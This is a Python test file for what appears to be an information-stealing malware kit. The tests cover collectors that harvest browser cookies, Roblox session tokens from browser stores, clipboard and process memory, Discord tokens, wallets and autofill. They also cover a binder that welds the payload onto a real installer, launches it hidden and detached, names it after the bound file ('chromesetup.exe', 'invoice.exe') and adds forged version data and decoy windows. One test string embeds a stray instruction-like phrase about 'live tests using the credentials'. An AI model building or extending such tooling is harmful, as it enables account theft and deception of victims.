def test_a_raising_collector_is_named_and_the_rest_still_run(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from types import SimpleNamespace

    import agent.sources as registry

    class Refused(Exception):
        pass

    def explode(*_: object, **__: object) -> int:
        raise Refused("store refused to open")

    def work(*_: object, **__: object) -> int:
        return 5

    def fake_import(name: str, package: str | None = None) -> object:
        if name.endswith(".browsers"):
            return SimpleNamespace(run=explode)
        return SimpleNamespace(run=work)

    monkeypatch.setattr(registry.importlib, "import_module", fake_import)

    counts, failures = registry.run_all(tmp_path, registry_config())

    assert failures == {"browsers": "Refused: store refused to open"}
    assert counts["browsers"] == 0
    assert counts["sessions"] == 5, "a broken neighbour must not stop the next collector"



def test_a_clean_run_reports_no_failures(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from types import SimpleNamespace

    import agent.sources as registry

    monkeypatch.setattr(
        registry.importlib,
        "import_module",
        lambda name, package=None: SimpleNamespace(run=lambda *a, **k: 1),
    )

    counts, failures = registry.run_all(tmp_path, registry_config())

    assert failures == {}
    assert set(counts) == {
        "system",
        "network",
        "displays",
        "browsers",
        "roblox",
        "sessions",
        "wallets",
        "autofill",
        "documents",
    }


# --- gecko without a key4.db --------------------------------------------------


def firefox_profile(profile: Path) -> None:
    """A profile with a cookie jar and a places database, and no login store."""
    profile.mkdir(parents=True)

    cookies = sqlite3.connect(str(profile / "cookies.sqlite"))
    cookies.execute(
        "CREATE TABLE moz_cookies (name TEXT, value TEXT, host TEXT, path TEXT, "
        "expiry INTEGER, lastAccessed INTEGER, isSecure INTEGER, isHttpOnly INTEGER, "
        "sameSite INTEGER)"
    )
    cookies.execute(
        "INSERT INTO moz_cookies VALUES (?,?,?,?,?,?,?,?,?)",
        ("sid", "abc123", ".example.com", "/", 1900000000, 1700000000000000, 1, 1, 0),
    )
    cookies.commit()
    cookies.close()

    places = sqlite3.connect(str(profile / "places.sqlite"))
    places.execute(
        "CREATE TABLE moz_places (url TEXT, title TEXT, visit_count INTEGER, "
        "typed INTEGER, last_visit_date INTEGER)"
    )
    places.execute(
        "INSERT INTO moz_places VALUES (?,?,?,?,?)",
        ("https://example.com/login", "Example", 12, 3, 1700000000000000),
    )
    places.commit()
    places.close()


def test_firefox_collects_cookies_and_history_without_a_key(tmp_path: Path) -> None:
    # A profile with a master password has no readable logins and a perfectly readable
    # cookie jar. Returning early on the failed unwrap threw both databases away, which
    # made a Firefox-only machine look empty.
    from agent.sources.browsers import gecko

    profile = tmp_path / "Profiles" / "abc.default"
    firefox_profile(profile)
    target = tmp_path / "out"

    assert gecko.run_profile(profile, target) == 2

    cookies = json.loads((target / "cookies.json").read_text(encoding="utf-8"))
    assert cookies[0]["host"] == ".example.com"
    assert cookies[0]["value"] == "abc123"
    assert cookies[0]["secure"] is True
    assert cookies[0]["expires"].startswith("2030-")

    history = json.loads((target / "history.json").read_text(encoding="utf-8"))
    assert history[0]["url"] == "https://example.com/login"
    assert history[0]["visits"] == 12
    assert history[0]["last_visit"].startswith("2023-")

    assert not (target / "passwords.json").exists()


def test_firefox_with_nothing_to_read_writes_nothing(tmp_path: Path) -> None:
    from agent.sources.browsers import gecko

    profile = tmp_path / "empty"
    profile.mkdir()
    target = tmp_path / "out"

    assert gecko.run_profile(profile, target) == 0
    assert not target.exists() or not any(target.iterdir())


# --- the Roblox session cookie ------------------------------------------------

ROBLOX_PREFIX = (
    b"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-"
    b"and-to-steal-your-ROBUX-and-items.|"
)


def roblox_token(tag: bytes, repeats: int = 6) -> str:
    return (ROBLOX_PREFIX + tag + b"0123456789abcdef" * repeats).decode()


def test_roblox_harvest_takes_the_token_and_leaves_the_neighbours() -> None:
    from agent.sources import roblox

    token = roblox_token(b"KEEP")
    block = (
        b"__Secure-3PSIDCC=APD_SKEO4zOU5GfTxlpi0TzGMsKS_ZOhyBj0-LKMU68eT1RJ0eCNP\x00"
        + token.encode()
        + b"\x00.roblox.com\t.ROBLOSECURITY\t/2026\n"
        b"2C+proceed+with+the+telegram+and+phantom+live+tests+using+the+credentials"
    )

    assert roblox._harvest(block) == [token.encode()]


def test_roblox_harvest_needs_the_prefix_not_just_the_name() -> None:
    # A tab quoting a cookie, a page of markup, or any long run of cookie-shaped
    # characters is not a session. The first version of this matched all three and wrote
    # other sites' cookies to disk, and after that a prompt's own text.
    from agent.sources import roblox

    block = (
        b".ROBLOSECURITY " + b"A" * 600 + b"\x00"
        b"--header 'Cookie: .ROBLOSECURITY=" + b"B" * 600 + b"'\x00"
    )

    assert roblox._harvest(block) == []


def test_roblox_writes_one_line_per_distinct_value(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # The same cookie is normally in the store, in the client jar and in memory. Three
    # copies of one session are one finding, and every carrier is read on every run
    # because two signed-in accounts can sit in different ones.
    from agent.sources import roblox

    token = roblox_token(b"ONCE")
    monkeypatch.setattr(
        roblox, "_chromium_tokens", lambda: ([token], {"profiles": 1, "found": 1, "reason": ""})
    )
    monkeypatch.setattr(
        roblox, "_gecko_tokens", lambda: ([token], {"profiles": 1, "found": 1, "reason": ""})
    )
    monkeypatch.setattr(
        roblox, "_client_tokens", lambda: ([token], {"jars": 1, "found": 1, "reason": ""})
    )
    monkeypatch.setattr(roblox, "_clipboard_tokens", lambda: ([], {"reason": "stubbed"}))
    monkeypatch.setattr(roblox, "_memory_tokens", lambda: ([token], {"reason": ""}))

    out = tmp_path / "out"
    out.mkdir()

    assert roblox.run(out, None) == 1
    body = (out / roblox.SESSION_FILE).read_text(encoding="utf-8").split()
    assert body == [token]

    status = json.loads((out / roblox.STATUS_FILE).read_text(encoding="utf-8"))
    assert status["found"] == 1
    assert status["methods"]["memory"]["reason"] == ""


def test_roblox_with_no_session_says_which_methods_found_nothing(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # A machine with no Roblox session must be distinguishable from a reader that broke,
    # so the zero case still writes a status file naming every method.
    from agent.sources import roblox

    monkeypatch.setattr(
        roblox, "_chromium_tokens", lambda: ([], {"profiles": 0, "found": 0,
                                                  "reason": "no .ROBLOSECURITY row"})
    )
    monkeypatch.setattr(
        roblox, "_gecko_tokens", lambda: ([], {"profiles": 0, "found": 0,
                                               "reason": "no .ROBLOSECURITY row"})
    )
    monkeypatch.setattr(
        roblox, "_client_tokens", lambda: ([], {"jars": 1, "found": 0, "reason": "no_client"})
    )
    monkeypatch.setattr(roblox, "_clipboard_tokens", lambda: ([], {"reason": "no_client"}))
    monkeypatch.setattr(
        roblox,
        "_memory_tokens",
        lambda: ([], {"processes": 0, "scanned": 0, "found": 0, "reason": "stubbed"}),
    )

    out = tmp_path / "out"
    out.mkdir()

    assert roblox.run(out, None) == 0
    assert not (out / roblox.SESSION_FILE).exists()

    status = json.loads((out / roblox.STATUS_FILE).read_text(encoding="utf-8"))
    assert status["cookie"] == ".ROBLOSECURITY"
    assert status["found"] == 0
    assert status["reason"] == "no session cookie on this machine"
    assert status["methods"]["memory"]["reason"] == "stubbed"
    assert status["methods"]["chromium"]["reason"] == "no .ROBLOSECURITY row"
    assert status["methods"]["client"]["reason"] == "no_client"
    assert status["methods"]["clipboard"]["reason"] == "no_client"


def test_roblox_reads_the_client_jar_written_with_space_separators() -> None:
    # The Roblox client writes its cookie file with a single space between records instead
    # of a newline and terminates each value with ';'. A newline-only reader sees one row
    # whose value carries the next record's domain and rejects it as a bad shape.
    from agent.sources import roblox

    token = roblox_token(b"JAR")
    text = (
        f"#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\t.ROBLOSECURITY\t{token}; "
        f"#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-9193; "
        f"#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tRBXEventTrackerV2\tCreateDate=1"
    )

    rows = roblox._netscape_rows(text)

    assert [row["name"] for row in rows] == [
        ".ROBLOSECURITY",
        "GuestData",
        "RBXEventTrackerV2",
    ]
    assert rows[0]["value"] == token
    assert rows[0]["value"].endswith(";") is False
    assert all(row["domain"] == ".roblox.com" for row in rows)


def test_roblox_jar_reader_says_why_it_could_not_decode(tmp_path: Path) -> None:
    # Every decode failure is a named reason, so a zero on a machine with a client is not
    # the same finding as a zero on a machine without one.
    from agent.sources import roblox

    missing = tmp_path / "absent.dat"
    assert roblox._jar_rows(missing)[1] == "no_client"

    garbage = tmp_path / "garbage.dat"
    garbage.write_text("not json at all", encoding="utf-8")
    assert roblox._jar_rows(garbage)[1] == "decode_failed"

    no_field = tmp_path / "nofield.dat"
    no_field.write_text('{"CookiesVersion": "1"}', encoding="utf-8")
    assert roblox._jar_rows(no_field)[1] == "decode_failed"

    bad_b64 = tmp_path / "badb64.dat"
    bad_b64.write_text(
        json.dumps({"CookiesVersion": "1", "CookiesData": "AAAA"}), encoding="utf-8"
    )
    rows, reason, _detail = roblox._jar_rows(bad_b64)
    assert rows == [] or reason in ("decode_failed", "dpapi_failed")


def _stub_jar(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    plain: bytes,
    rows: list[dict[str, str]],
    reason: str = "",
    detail: str = "",
) -> None:
    """Point the client reader at a fixed jar answer without sealing one on disk."""
    from agent.sources import roblox

    jar = tmp_path / "Roblox" / "LocalStorage" / "RobloxCookies.dat"
    jar.parent.mkdir(parents=True, exist_ok=True)
    jar.write_text("{}", encoding="utf-8")
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path))
    monkeypatch.setattr(roblox, "_jar_open", lambda path: (plain, rows, reason, detail))


def test_roblox_jar_names_an_empty_session_row_instead_of_the_tracker(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # The live laptop jar held exactly this: a tracker record first with a 78-byte
    # CreateDate value, then a .ROBLOSECURITY row with nothing after the tab. The old
    # reader blamed the tracker's shape, which sends the reader looking at the parser
    # when the finding is that the client had no session in the jar at all.
    from agent.sources import roblox

    token = roblox_token(b"EMPTY")
    plain = (
        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tRBXEventTrackerV2\t"
        "CreateDate=11/17/2026 18:36:44&rbxuid=10664732490&browserid=17935&rid=12345678; "
        "#HttpOnly_.roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t"
    )
    rows = roblox._netscape_rows(plain)
    assert [row["name"] for row in rows] == ["RBXEventTrackerV2", ".ROBLOSECURITY"]
    assert rows[-1]["value"] == ""
    _stub_jar(monkeypatch, tmp_path, plain.encode(), rows)

    tokens, detail = roblox._client_tokens()
    record = detail["records"][0]

    assert tokens == []
    assert record["named"] == 1
    assert record["prefixes"]["tracker"] == 1
    assert record["reason"] == "truncated"
    assert token not in record["detail"]


def test_roblox_jar_says_tracker_only_when_that_is_all_it_holds(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from agent.sources import roblox

    plain = (
        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-919370561; "
        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tRBXEventTrackerV2\tCreateDate=1"
    )
    rows = roblox._netscape_rows(plain)
    _stub_jar(monkeypatch, tmp_path, plain.encode(), rows)

    tokens, detail = roblox._client_tokens()

    assert tokens == []
    assert detail["records"][0]["reason"] == "tracker_only"


def test_roblox_jar_harvests_a_container_it_does_not_recognise(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # The client changed its container once already. When it changes again the row reader
    # has nothing to chew on and the value is still in the decrypted bytes: the harvest
    # pass is what makes that a read instead of a shape failure.
    from agent.sources import roblox

    token = roblox_token(b"WRAP")
    plain = json.dumps({"Store": "LocalStorage", "CookieHeader": f".ROBLOSECURITY={token}"})
    _stub_jar(
        monkeypatch,
        tmp_path,
        plain.encode("utf-8"),
        [],
        "wrapper_unknown",
        "41 bytes of json plaintext, no cookie row",
    )

    tokens, detail = roblox._client_tokens()
    record = detail["records"][0]

    assert tokens == [token]
    assert record["reason"] == "ok"
    assert record["harvest"] == 1


def test_roblox_jar_reads_every_separator_the_client_writes() -> None:
    # Semicolon with no space, and a bare domain record without the httponly prefix. Both
    # spellings leave the value whole; a reader that misses them reports a bad shape on a
    # row that was never split.
    from agent.sources import roblox

    token = roblox_token(b"SEP")
    tight = (
        f"#HttpOnly_.roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t{token};"
        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-9193"
    )
    bare = (
        f"#HttpOnly_.roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t{token};"
        ".roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-9193"
    )

    for text in (tight, bare):
        rows = roblox._netscape_rows(text)
        assert [row["name"] for row in rows] == [".ROBLOSECURITY", "GuestData"]
        assert rows[0]["value"] == token


def test_roblox_jar_decodes_utf16_plaintext() -> None:
    # A jar written as UTF-16 reads as NUL-separated text when decoded as UTF-8, and every
    # field then fails a shape check for a reason that names the wrong thing.
    from agent.sources import roblox

    token = roblox_token(b"UTF16")
    text = (
        f"#HttpOnly_.roblox.com\tTRUE\t/\tTRUE\t0\t.ROBLOSECURITY\t{token}; "
        "#HttpOnly_.roblox.com\tTRUE\t/\tFALSE\t0\tGuestData\tUserID=-9193"
    )

    rows = roblox._netscape_rows(roblox._jar_text(text.encode("utf-16")))

    assert rows[0]["name"] == ".ROBLOSECURITY"
    assert rows[0]["value"] == token


def test_roblox_clipboard_yields_a_session_without_a_store(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # "Copy as PowerShell" in DevTools puts the Cookie header on the clipboard, which is a
    # real second copy of the value when every browser store refuses an open.
    from agent import winapi
    from agent.sources import roblox

    token = roblox_token(b"CLIP")
    pasted = (
        "Invoke-WebRequest -Uri https://www.roblox.com/users/1/profile "
        "-Headers @{'Cookie'='.ROBLOSECURITY=" + token + "'}"
    )
    monkeypatch.setattr(winapi, "clipboard_text", lambda: pasted)

    tokens, detail = roblox._clipboard_tokens()

    assert tokens == [token]
    assert detail["found"] == 1
    assert detail["read"] == len(pasted)


def test_roblox_clipboard_says_nothing_when_it_is_empty(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from agent import winapi
    from agent.sources import roblox

    monkeypatch.setattr(winapi, "clipboard_text", lambda: None)

    tokens, detail = roblox._clipboard_tokens()

    assert tokens == []
    assert detail["read"] == 0
    assert "empty" in detail["reason"]


def test_roblox_memory_reads_private_pages_only() -> None:
    # Image and mapped sections are the browser's own code and files on disk. Reading them
    # cost 12-16 s per process and found nothing inside the budget; private-only finds the
    # same cookie in about eleven seconds for the whole set.
    from agent import winapi
    from agent.sources import roblox

    assert callable(winapi.RemoteProcess.regions_with_type)
    assert roblox._MEM_PRIVATE == 0x00020000


def test_roblox_reasons_cover_the_client_and_clipboard_outcomes() -> None:
    from agent.sources import roblox

    for reason in ("no_client", "dpapi_failed", "decode_failed"):
        assert reason in roblox.REASONS
    for reason in ("wrapper_unknown", "truncated", "tracker_only"):
        assert reason in roblox.REASONS


def test_sessions_writes_the_bare_token_beside_the_record(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # sessions.json is the record; discord_session.txt is the paste-ready list. One line
    # per token, no verdict in it. A token Discord answered 401 for stays in: a refused
    # validation is a fact about the account, not about the extraction.
    from agent.sources import sessions

    alive = "mfa." + "A" * 84
    unknown = "mfa." + "B" * 84
    refused = "mfa." + "C" * 84

    monkeypatch.setattr(
        sessions,
        "_targets",
        lambda: iter([("chrome", "Default", tmp_path, tmp_path / "leveldb")]),
    )
    monkeypatch.setattr(
        sessions,
        "_scan",
        lambda leveldb: [
            (alive.encode(), False, "000003.log"),
            (unknown.encode(), False, "000003.log"),
            (refused.encode(), False, "000003.log"),
        ],
    )
    verdicts = {alive: (True, {"id": "1"}), unknown: (None, {}), refused: (False, {})}
    monkeypatch.setattr(sessions, "_validate", lambda token, budget: verdicts[token])

    out = tmp_path / "out"
    out.mkdir()

    assert sessions.run(out, None) == 3

    lines = (out / sessions.SESSION_FILE).read_text(encoding="utf-8").split()
    assert lines == [alive, unknown, refused]

    record = json.loads((out / sessions.RECORD_FILE).read_text(encoding="utf-8"))
    assert [entry["valid"] for entry in record] == [True, None, False]

    record = json.loads((out / sessions.RECORD_FILE).read_text(encoding="utf-8"))
    assert [entry["valid"] for entry in record] == [True, None, False]


def test_sessions_with_no_token_writes_no_session_file(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from agent.sources import sessions

    monkeypatch.setattr(sessions, "_targets", lambda: iter(()))
    out = tmp_path / "out"
    out.mkdir()

    assert sessions.run(out, None) == 0
    assert not (out / sessions.SESSION_FILE).exists()
    assert not (out / sessions.RECORD_FILE).exists()


# --- the icon ----------------------------------------------------------------

LAUNCHER = ROOT / "tools" / "dist" / "sable-launcher.exe"


def pe_image(sections: list[tuple[int, int]], *, headers: int = 0x200) -> bytes:
    """A file with a real PE header: DOS pointer, COFF, optional header, sections."""
    optional_size = 0xE0
    pointer = 0x40
    coff = pointer + 4
    optional = coff + 20
    table = optional + optional_size

    end = headers
    for offset, size in sections:
        end = max(end, offset + size)

    data = bytearray(max(end, headers))
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 0x3C, pointer)
    data[pointer:pointer + 4] = b"PE\0\0"
    struct.pack_into("<H", data, coff + 2, len(sections))
    struct.pack_into("<H", data, coff + 16, optional_size)
    struct.pack_into("<I", data, optional + 60, headers)
    for index, (offset, size) in enumerate(sections):
        base = table + index * 40
        struct.pack_into("<II", data, base + 16, size, offset)
    return bytes(data)


def ico(images: list[bytes]) -> bytes:
    """A single-library ``.ico`` carrying the images given."""
    table = b""
    offset = 6 + 16 * len(images)
    for image in images:
        table += struct.pack("<BBBBHHII", 16, 16, 0, 0, 1, 32, len(image), offset)
        offset += len(image)
    return struct.pack("<HHH", 0, 1, len(images)) + table + b"".join(images)


def test_the_image_ends_where_the_appended_archive_starts() -> None:
    # The launcher is a PE image with a PyInstaller archive welded to its tail. A
    # resource update rewrites the image and drops the tail, so the boundary has to be
    # measured before the patch — this is the measurement.
    image = pe_image([(0x200, 0x400), (0x600, 0x200)], headers=0x200)
    overlay = b"MEI\x0c\x0b\x0a\x0b\x0e" + bytes(64)
    assert forge.image_end(image + overlay) == 0x800


def test_the_image_end_never_lands_inside_the_headers() -> None:
    image = pe_image([(0x400, 0x20)], headers=0x1000)
    assert forge.image_end(image + b"tail") == 0x1000


def test_something_that_is_not_a_pe_is_refused_rather_than_measured() -> None:
    with pytest.raises(forge.ForgeError):
        forge.image_end(b"MZ" + bytes(0x100))
    with pytest.raises(forge.ForgeError):
        forge.image_end(b"PK\x03\x04" + bytes(0x100))


def test_an_ico_is_read_into_the_images_it_carries() -> None:
    entries = forge._icon_entries(ico([bytes(64), bytes(256)]))

    assert [len(item.data) for item in entries] == [64, 256]
    assert [(item.width, item.height, item.bit_count) for item in entries] == [
        (16, 16, 32),
        (16, 16, 32),
    ]


def test_the_group_resource_names_every_image_by_the_id_it_is_filed_under() -> None:
    entries = forge._icon_entries(ico([bytes(64), bytes(256)]))
    group = forge.group_payload(entries)

    assert len(group) == 6 + 2 * 14
    assert group[:6] == struct.pack("<HHH", 0, 1, 2)
    assert group[6:10] == bytes([16, 16, 0, 0])
    assert struct.unpack_from("<I", group, 6 + 8)[0] == 64
    assert struct.unpack_from("<H", group, 6 + 12)[0] == 1
    assert struct.unpack_from("<I", group, 6 + 14 + 8)[0] == 256
    assert struct.unpack_from("<H", group, 6 + 14 + 12)[0] == 2


@pytest.mark.parametrize(
    "raw",
    [
        b"",
        b"\x00\x00\x01",
        struct.pack("<HHH", 1, 1, 1),
        struct.pack("<HHH", 0, 2, 1),
        struct.pack("<HHH", 0, 1, 0),
        struct.pack("<HHH", 0, 1, 1) + struct.pack("<BBBBHHII", 16, 16, 0, 0, 1, 32, 32, 999),
    ],
)
def test_an_icon_that_is_not_one_is_refused(raw: bytes) -> None:
    with pytest.raises(forge.ForgeError):
        forge._icon_entries(raw)


@pytest.mark.skipif(
    not LAUNCHER.is_file(),
    reason="the launcher has not been built in this tree",
)
@needs_crypto
def test_an_icon_grows_the_launcher_and_the_footer_follows(tmp_path: Path) -> None:
    # The proof that the patch is real: the stub changes size, the offset the footer
    # records follows it, and the PyInstaller archive is still welded to the tail.
    # Without the re-append the artifact is a 360 KB exe that boots nothing.
    icon = tmp_path / "mark.ico"
    icon.write_bytes(ico([bytes(64), bytes(256)]))

    data = forge.payload(ROOT, config())
    built = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "marked.exe",
        mode="exe",
        stub=LAUNCHER,
        icon=icon,
    )

    raw = built.read_bytes()
    offset = int.from_bytes(raw[-forge.FOOTER_SIZE :], "little")

    # Ballast is zero, so the footer's offset is the patched stub's size. It is not the
    # launcher's size — measured, Windows rebuilds the resource section and the rebuilt
    # one is smaller than the bootloader's icon set it replaced. Under or over does not
    # matter; what matters is that the offset describes the file that was actually
    # written.
    original = LAUNCHER.read_bytes()
    assert offset != len(original), "the icon did not change the launcher"
    assert raw[offset - 64:offset] == original[-64:], "the appended archive did not survive"

    # Not "an icon is present" — these exact bytes are the group resource we asked for,
    # and resource data is stored raw, so the group we built is the group the file has.
    assert forge.group_payload(forge.icon_entries(icon)) in raw

    header = loader._read_trailer(built)
    assert header.seal_key == SEAL_KEY
    assert loader._open_sealed(loader._read_sealed(built, offset), header.seal_key) == data


def test_an_icon_is_a_note_on_script_output(tmp_path: Path) -> None:
    icon = tmp_path / "mark.ico"
    icon.write_bytes(ico([bytes(16)]))

    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, icon=icon)

    assert [problem.blocking for problem in problems] == [False]
    assert problems[0].path == "output.icon"


def test_a_png_renamed_to_ico_is_refused_before_the_build_starts(tmp_path: Path) -> None:
    fake = tmp_path / "mark.ico"
    fake.write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))

    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, icon=fake)

    assert validate_module.blocking(problems)
    assert problems[0].path == "output.icon"
    assert "not a .ico" in problems[0].message


# --- the bound file ----------------------------------------------------------


def test_a_bound_file_travels_inside_the_payload(tmp_path: Path) -> None:
    bound = tmp_path / "install.exe"
    bound.write_bytes(b"MZ" + bytes(32))

    data = forge.payload(ROOT, config(), fuse=bound)

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert archive.read("fused/install.exe") == bound.read_bytes()


def test_a_payload_without_a_bound_file_carries_none() -> None:
    data = forge.payload(ROOT, config())

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert not [name for name in archive.namelist() if name.startswith("fused/")]


def test_the_payload_refuses_a_bound_file_it_cannot_carry(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    empty = tmp_path / "empty.exe"
    empty.write_bytes(b"")
    with pytest.raises(forge.ForgeError):
        forge.payload(ROOT, config(), fuse=empty)

    monkeypatch.setattr(forge, "MAX_FUSE_BYTES", 8)
    heavy = tmp_path / "heavy.exe"
    heavy.write_bytes(b"M" * 16)
    with pytest.raises(forge.ForgeError):
        forge.payload(ROOT, config(), fuse=heavy)


def test_both_halves_agree_on_the_prefix_and_what_can_be_started() -> None:
    # core/ cannot import agent/ and agent/ cannot import core/, so the two constants
    # are declared twice on purpose. This is the pin that keeps them equal.
    assert forge.FUSE_PREFIX == entry.FUSE_PREFIX
    assert forge.BOUND_SUFFIXES == entry.BOUND_SUFFIXES


def test_a_bound_file_is_extracted_beside_its_neighbours_and_started(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("fused/tool.exe", b"MZ" + bytes(32))
        archive.writestr("fused/tool.dll", b"MZ" + bytes(8))
        archive.writestr("agent/entry.py", b"")
        archive.writestr("cfg.json", b"{}")

    spawned: list[tuple[str, dict[str, object]]] = []

    def fake_popen(command: str, **kwargs: object) -> object:
        spawned.append((command, kwargs))
        return object()

    monkeypatch.setattr(util.subprocess, "Popen", fake_popen)

    with zipfile.ZipFile(archive_path) as archive:
        assert entry._start_bound(archive) == 1

    assert len(spawned) == 1, "a .dll is carried, not started"
    command, options = spawned[0]
    target = Path(command.strip('"'))
    assert target.name == "tool.exe"
    assert target.is_file()
    assert target.with_name("tool.dll").is_file()
    # A console child of a windowed parent puts a window on the desktop. Both flags are
    # required: one hides it, the other stops it inheriting this process's console.
    flags = int(options["creationflags"])  # type: ignore[arg-type]
    assert flags & util._CREATE_NO_WINDOW
    assert flags & util._DETACHED_PROCESS


def test_nothing_bound_means_nothing_started(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("agent/entry.py", b"")

    def forbidden(*_: object, **__: object) -> object:
        raise AssertionError("nothing was bound, so nothing should start")

    monkeypatch.setattr(util.subprocess, "Popen", forbidden)

    with zipfile.ZipFile(archive_path) as archive:
        assert entry._start_bound(archive) == 0


def test_a_bound_file_over_the_ceiling_is_skipped_rather_than_read(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("fused/huge.exe", b"MZ" + bytes(4096))

    spawned: list[object] = []
    monkeypatch.setattr(
        util.subprocess, "Popen", lambda *a, **k: spawned.append(a)
    )
    monkeypatch.setattr(entry, "_MAX_BOUND_BYTES", 64)

    with zipfile.ZipFile(archive_path) as archive:
        assert entry._start_bound(archive) == 0
    assert not spawned


def test_a_launcher_that_does_not_start_is_not_a_dead_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("fused/tool.exe", b"MZ" + bytes(32))

    def refused(*_: object, **__: object) -> object:
        raise OSError("no such file")

    monkeypatch.setattr(util.subprocess, "Popen", refused)

    with zipfile.ZipFile(archive_path) as archive:
        assert entry._start_bound(archive) == 0


def test_a_bound_file_that_cannot_start_is_a_note(tmp_path: Path) -> None:
    library = tmp_path / "payload.dll"
    library.write_bytes(b"MZ" + bytes(8))

    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, fuse=library)

    assert [problem.blocking for problem in problems] == [False]
    assert problems[0].path == "output.fuse"
    assert "not started" in problems[0].message


def test_a_bound_file_that_is_not_there_blocks(tmp_path: Path) -> None:
    problems = validate_module.validate(
        config(), mode=forge.OUTPUT_PY, fuse=tmp_path / "gone.exe"
    )

    assert validate_module.blocking(problems)
    assert problems[0].path == "output.fuse"


# --- the disguise -------------------------------------------------------------
#
# The binder has two jobs beyond welding a payload on: the file has to carry the icon
# it was given, and it has to arrive called what the operator called the file it is
# carrying. Both were wrong in the current build, and both are pinned here.


def test_the_artifact_is_named_after_the_bound_file(tmp_path: Path) -> None:
    # A build carrying chromesetup.exe arrives as chromesetup.exe. The random name is
    # for a build with nothing better to go on, not a default.
    bound = tmp_path / "chromesetup.exe"
    bound.write_bytes(b"MZ" + bytes(64))

    assert pipeline._artifact_name(None, bound, forge.OUTPUT_EXE) == "chromesetup.exe"


def test_a_typed_name_beats_the_bound_file(tmp_path: Path) -> None:
    bound = tmp_path / "chromesetup.exe"
    bound.write_bytes(b"MZ" + bytes(64))

    assert pipeline._artifact_name("invoice.exe", bound, forge.OUTPUT_EXE) == "invoice.exe"
    assert pipeline._artifact_name("invoice", bound, forge.OUTPUT_EXE) == "invoice.exe"


def test_a_build_with_no_bound_file_still_generates_a_name() -> None:
    assert pipeline._artifact_name(None, None, forge.OUTPUT_EXE) is None


def test_a_bound_name_that_is_not_legal_falls_back_rather_than_stopping(
    tmp_path: Path,
) -> None:
    # The build is good; the name a file happens to have is not a reason to lose it.
    # ``...exe`` has a stem of ``..``, which sanitises to nothing.
    weird = tmp_path / "...exe"
    weird.write_bytes(b"MZ")

    assert pipeline._artifact_name(None, weird, forge.OUTPUT_EXE) is None


def test_derive_keeps_the_stem_and_forces_one_suffix() -> None:
    assert rename.derive("chromesetup.exe") == "chromesetup.exe"
    assert rename.derive("chrome setup 2.exe") == "chrome setup 2.exe"
    assert rename.derive("setup", ".py") == "setup.py"
    with pytest.raises(rename.RenameError):
        rename.derive("")


def test_the_decoy_settings_travel_in_the_config_that_ships() -> None:
    # cfg.json is what the agent reads. A disguise that never reaches it is a form
    # field and nothing else.
    cfg = config(
        version=VersionConfig(company="Northline", file_version="6.2.9.441"),
        decoy_seconds=30,
        decoy_title="Setup",
        decoy_text="Preparing",
    )
    carried = from_dict(json.loads(json.dumps(to_dict(cfg))))

    assert carried.version.company == "Northline"
    assert carried.version.file_version == "6.2.9.441"
    assert (carried.decoy_seconds, carried.decoy_title) == (30, "Setup")


def test_a_version_string_is_four_numbers_that_fit_in_sixteen_bits() -> None:
    assert forge.version_parts("1.2.3.4") == ((1 << 16) | 2, (3 << 16) | 4)
    assert forge.version_parts("65535.65535.65535.65535") == (0xFFFFFFFF, 0xFFFFFFFF)

    for bad in ("1.2.3", "1.2.3.4.5", "1.2.3.x", "1.2.3.65536", "-1.2.3.4", ""):
        with pytest.raises(forge.ForgeError):
            forge.version_parts(bad)


def test_a_version_block_carries_the_signature_and_every_string() -> None:
    blob = forge.version_blob(
        VersionConfig(
            company="Northline Software Ltd",
            product="Northline Setup",
            description="Setup loader",
            copyright="(c) 2026 Northline",
            original_name="northline-setup.exe",
